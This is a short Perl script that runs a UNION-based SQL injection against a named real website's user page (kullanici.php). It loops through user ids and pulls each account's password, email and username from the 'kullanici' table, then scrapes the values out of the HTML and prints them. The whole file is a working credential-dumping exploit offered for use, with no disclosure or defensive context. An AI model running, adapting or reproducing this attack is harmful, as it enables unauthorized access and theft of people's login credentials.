#!/usr/bin/perl

use HTTP::Request::Common;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use Data::Dumper;

$browser = LWP::UserAgent->new;
$url = "http://www.devren.com.tr/kullanici.php?id=-1+union+select+1,2,3,4,5,6,sifre,email,kad,10,11,12,13,14,15,16,17,18,19,20+from+kullanici+where+id=%d";

#Tel:</u> sample@email.tst</td>
#Faks:</u> username</td>
#E-Posta:</u> password</td>

$found = 0;
for($i=1;;$i++)
{
	print STDERR "Trying id: $i" . "\t"x7 . "Found:$found" . "\r";
	$request = GET sprintf($url, $i);
	$response = $browser->request($request);
	$res = $response->content;

	$info="%s %s %s\n";
	if(index($res, "Tel:</u>")>0)
	{
		$res =~ m/Tel:<\/u> (.*?)<\/td>/i;
		$mail = $1;
		$res =~ m/Faks:<\/u> (.*?)<\/td>/i;
		$name = $1;
		$res =~ m/E-Posta:<\/u> (.*?)<\/td>/i;
		$pass = $1;
		$found ++;
		
		printf($info, $mail, $name, $pass);
	}
}


